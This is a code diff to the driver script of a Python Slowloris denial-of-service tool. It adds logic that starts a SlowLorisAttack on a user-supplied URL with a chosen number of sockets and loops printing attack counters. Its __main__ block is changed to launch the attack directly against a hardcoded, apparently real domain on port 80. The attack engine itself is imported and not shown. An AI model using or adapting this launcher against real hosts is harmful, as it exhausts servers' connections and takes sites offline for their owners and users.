@@ -25,21 +25,35 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 """
 
+import argparse
+import datetime
 import re
 import sys
-import datetime
-import argparse
-
-from SlowLoris import TargetInfo
+import threading
+import time
 from signal import signal, SIGABRT, SIGILL, SIGINT, SIGSEGV, SIGTERM
 
+from SlowLoris import TargetInfo, SlowLorisAttack
+
 __all__ = ["main"]
+
+slowloris = None
+
+
+class ExitException(Exception):
+    pass
 
 
 def cleanup(*args):
     sys.stdout.write("\r")
     sys.stdout.flush()
-    sys.exit(0)
+    try:
+        global slowloris
+        slowloris.stop_attack()
+        del slowloris
+        raise ExitException()
+    except ExitException:
+        sys.exit(0)
 
 
 def init():
@@ -119,13 +133,36 @@ def print_info(target):
     print_table(table)
 
 
+def print_status():
+    sys.stdout.write("\r")
+    sys.stdout.write(str(slowloris.get_counters()))
+    sys.stdout.flush()
+
+
 def main():
+    # TODO check site exists
     init()
     args = parse_args()
     target = TargetInfo(url=args['url'], port=args['port'])
     print_info(target)
-    # launch slowloris
+    global slowloris
+    slowloris = SlowLorisAttack(target, sockets=args['sockets'])
+    slowloris.start_attack()
+    # timer = threading.Timer(1.5, print_status)
+    # timer.start()
+
+    while True:
+        print_status()
+        time.sleep(0.5)
 
 
 if __name__ == "__main__":
-    main()
+    target = TargetInfo(url="http://insart.com/", port=80)
+    target.get_info()
+    global slowloris
+    slowloris = SlowLorisAttack(target)
+    slowloris.start_attack()
+    timer = threading.Timer(0.8, print_status)
+
+    while True:
+        time.sleep(0.5)
